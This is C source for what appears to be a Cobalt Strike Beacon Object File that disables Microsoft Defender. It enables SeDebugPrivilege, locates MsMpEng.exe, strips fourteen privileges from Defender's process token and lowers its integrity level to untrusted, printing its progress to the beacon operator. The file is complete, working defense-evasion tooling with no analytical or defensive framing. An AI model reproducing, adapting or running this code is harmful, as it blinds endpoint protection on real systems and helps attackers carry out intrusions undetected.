#include <Windows.h>
#include "beacon.h"
#include <TlHelp32.h>

WINBASEAPI HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
WINBASEAPI BOOLEAN WINAPI KERNEL32$Process32First(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
WINBASEAPI BOOLEAN WINAPI KERNEL32$Process32Next(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
WINBASEAPI int WINAPI KERNEL32$lstrcmpiA(LPCSTR lpString1, LPCSTR lpString2);
WINBASEAPI BOOLEAN WINAPI KERNEL32$CloseHandle(HANDLE hObject);
WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(VOID);
WINBASEAPI HANDLE WINAPI KERNEL32$GetCurrentProcess(VOID);
WINBASEAPI BOOLEAN WINAPI ADVAPI32$LookupPrivilegeValueA(LPCSTR lpSystemName, LPCSTR lpName, PLUID  lpLuid);
WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD dwDesiredAccess, BOOLEAN bInheritHandle, DWORD dwProcessId);
WINADVAPI BOOLEAN WINAPI ADVAPI32$OpenProcessToken(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
WINADVAPI BOOLEAN WINAPI ADVAPI32$SetTokenInformation(HANDLE ProcessHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength);
WINADVAPI BOOLEAN WINAPI ADVAPI32$ConvertStringSidToSidA(LPCSTR StringSid, PSID* Sid);
WINADVAPI BOOLEAN WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE TokenHandle,BOOL DisableAllPrivileges,PTOKEN_PRIVILEGES NewState,DWORD BufferLength,PTOKEN_PRIVILEGES PreviousState,PDWORD ReturnLength);
WINADVAPI DWORD WINAPI ADVAPI32$GetLengthSid(PSID pSid);

BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege);
int FindProcess(LPCTSTR procName);

int main()
{

    LPCSTR tokenPrivileges[] = {
         "SeAssignPrimaryTokenPrivilege",
         "SeBackupPrivilege",
         "SeDebugPrivilege",
         "SeChangeNotifyPrivilege",
         "SeImpersonatePrivilege",
         "SeIncreaseBasePriorityPrivilege",
         "SeIncreaseQuotaPrivilege",
         "SeLoadDriverPrivilege",
         "SeRestorePrivilege",
         "SeSecurityPrivilege",
         "SeShutdownPrivilege",
         "SeSystemEnvironmentPrivilege",
         "SeTakeOwnershipPrivilege",
         "SeTcbPrivilege"
    };

    HANDLE hCurrentToken = NULL; // Handle for current process token
    HANDLE hDefenderProc = NULL; // Handle for defender process
    HANDLE hDefenderToken = NULL; // Handle for defender process token
    int defenderPID = 0;

    // Get handle to current process token
    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_ALL_ACCESS, &hCurrentToken)) {
        BeaconPrintf(CALLBACK_OUTPUT,"[!] Could not get handle on current process token...\n");
        return FALSE;
    }
    BeaconPrintf(CALLBACK_OUTPUT,"[+] Got handle to current process token: %p\n", hCurrentToken);

    // Assign SeDebugPrivilege to current process token
    if (!SetPrivilege(hCurrentToken, "SeDebugPrivilege", TRUE)) {
        BeaconPrintf(CALLBACK_OUTPUT,"[!] Could not assign SeDebugPrivilege to current process token...\n");
        return FALSE;
    }
    BeaconPrintf(CALLBACK_OUTPUT,"[+] Successfully assigned SeDebugPrivilege to current process token...\n");


    // Get PID of defender Process 
    defenderPID = FindProcess("MsMpEng.exe");
    if (!defenderPID) {
        BeaconPrintf(CALLBACK_OUTPUT,"[!] Could not get PID of MsMpEng.exe...\n");
        return FALSE;
    }
    BeaconPrintf(CALLBACK_OUTPUT,"[+] Got PID of MsMpEng.exe: %i\n", defenderPID);

    // Get handle on process + token
    hDefenderProc = KERNEL32$OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, defenderPID);
    if (!ADVAPI32$OpenProcessToken(hDefenderProc, TOKEN_ALL_ACCESS, &hDefenderToken)) {
        BeaconPrintf(CALLBACK_OUTPUT,"[!] Could not get handle on defender token...\n");
        return FALSE;
    }
    BeaconPrintf(CALLBACK_OUTPUT,"[+] Got handle on defender process token: %p\n", hDefenderToken);

    // Strip privileges from token
    BeaconPrintf(CALLBACK_OUTPUT,"[+] Attempting to strip token:\n");
    for (int i = 0; i < 14; i++)
    {
        BeaconPrintf(CALLBACK_OUTPUT,"   --- %s - ", tokenPrivileges[i]);
        if (!SetPrivilege(hDefenderToken, tokenPrivileges[i], FALSE)) {
            BeaconPrintf(CALLBACK_OUTPUT,"FAILURE!\n");
            BeaconPrintf(CALLBACK_OUTPUT,"[!] Error stripping token privileges...\n");
            return FALSE;
        }
        BeaconPrintf(CALLBACK_OUTPUT,"SUCCESS!\n");
    }
    BeaconPrintf(CALLBACK_OUTPUT,"[+] Token privileges successfully stripped...\n");

    // Change integrity level to untrusted
    BeaconPrintf(CALLBACK_OUTPUT,"[+] Attempting to set MsMpEng.exe token integrity level to untrusted...\n");
    TOKEN_MANDATORY_LABEL tml = { NULL };
    tml.Label.Attributes = SE_GROUP_INTEGRITY;
    ADVAPI32$ConvertStringSidToSidA("S-1-16-0", &(tml.Label.Sid)); //ML_UNTRUSTED
    if (!ADVAPI32$SetTokenInformation(hDefenderToken, TokenIntegrityLevel, &tml, sizeof(TOKEN_MANDATORY_LABEL) + ADVAPI32$GetLengthSid(tml.Label.Sid))) {
        BeaconPrintf(CALLBACK_OUTPUT,"[!] Error while setting integrity level...\n");
        return FALSE;
    }
    BeaconPrintf(CALLBACK_OUTPUT,"[+] Successfully set token integrity level to untrusted...\n");

    BeaconPrintf(CALLBACK_OUTPUT,"[+] Cleaning up...");
    KERNEL32$CloseHandle(hCurrentToken);
    KERNEL32$CloseHandle(hDefenderProc);
    KERNEL32$CloseHandle(hDefenderToken);

}

BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
{
    TOKEN_PRIVILEGES tokenPrivs;
    LUID luid;

    if (!ADVAPI32$LookupPrivilegeValueA(NULL, lpszPrivilege, &luid))
    {
        BeaconPrintf(CALLBACK_OUTPUT,"LookupPrivilegeValue error: %u\n", KERNEL32$GetLastError());
        return FALSE;
    }

    tokenPrivs.PrivilegeCount = 1;
    tokenPrivs.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
        tokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_REMOVED;

    // Enable the privilege or disable all privileges.

    if (!ADVAPI32$AdjustTokenPrivileges(hToken, FALSE, &tokenPrivs, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
    {
        BeaconPrintf(CALLBACK_OUTPUT,"[!] AdjustTokenPrivileges error: %u\n", KERNEL32$GetLastError());
        return FALSE;
    }

    if (KERNEL32$GetLastError() == ERROR_NOT_ALL_ASSIGNED)
    {
        return FALSE;
    }
    return TRUE;
}

int FindProcess(LPCTSTR procName) {

    HANDLE hProcSnap = NULL;
    PROCESSENTRY32 pe32;
    int pid = 0;

    hProcSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!KERNEL32$Process32First(hProcSnap, &pe32)) {
        KERNEL32$CloseHandle(hProcSnap);
        return 0;
    }

    while (KERNEL32$Process32Next(hProcSnap, &pe32)) {
        if (KERNEL32$lstrcmpiA(procName, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    }

    KERNEL32$CloseHandle(hProcSnap);
    return pid;
}

void go(char* args, int alen){
    main();
}